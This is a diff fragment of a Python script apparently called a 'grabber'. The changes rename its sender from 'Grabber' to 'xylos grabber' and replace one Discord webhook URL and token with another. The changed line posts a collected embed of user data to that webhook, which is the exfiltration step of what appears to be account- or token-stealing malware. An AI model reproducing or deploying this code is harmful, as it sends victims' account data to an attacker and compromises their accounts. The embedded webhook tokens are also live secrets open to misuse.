@@ -201,11 +201,11 @@ def main():
                             }
                         }
                     ],
-                    "username": "Grabber",
+                    "username": "xylos grabber",
                     "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                 }
 
-                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1368368605275881522/Cl1NFlMhlP5k6AXj70yvtCOlt6QOeLQKYozd8hA2d12FsiwML0AtwtCYDr0Fb0duIuvj', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+                urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/webhooks/1371790913055232031/RlLndCXUoUWseJjd0R1cS_QXnXIPHIVUjuBUqZHzGBExLOlTetgcEpzo21I_2mcyeL5R', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
             except urllib.error.HTTPError or json.JSONDecodeError:
                 continue
             except Exception as e:
